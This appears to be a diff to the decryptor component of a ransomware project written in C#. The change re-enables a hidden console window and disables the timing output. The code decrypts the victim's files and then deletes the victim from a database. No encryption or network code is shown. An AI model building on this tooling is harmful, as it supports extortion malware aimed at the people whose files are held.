@@ -28,12 +28,12 @@ namespace Decryptor
 		
 		public static void Main(string[] args)
 		{              
-			//hideConsole();
+			hideConsole();
 			
 			TryToGetKey();
 			
 			
-			var watch = System.Diagnostics.Stopwatch.StartNew();
+			//var watch = System.Diagnostics.Stopwatch.StartNew();
 			
 			
 			AesCryptoServiceProvider decryptAes = getDecryptionCipher();
@@ -41,9 +41,9 @@ namespace Decryptor
 			decryptAllFiles(baseDirectory, decryptAes);
 			decryptToDecryptList(decryptAes);
 			
-			watch.Stop();
-			var elapsedMs = watch.ElapsedMilliseconds;
-			Console.WriteLine("Elapsed Time: "+ elapsedMs + "and in Seconds: "+ (elapsedMs/1000));
+			//watch.Stop();
+			//var elapsedMs = watch.ElapsedMilliseconds;
+			//Console.WriteLine("Elapsed Time: "+ elapsedMs + "and in Seconds: "+ (elapsedMs/1000));
 
 			dislpayCompletionMessage();
 			deleteVictimFromDB();
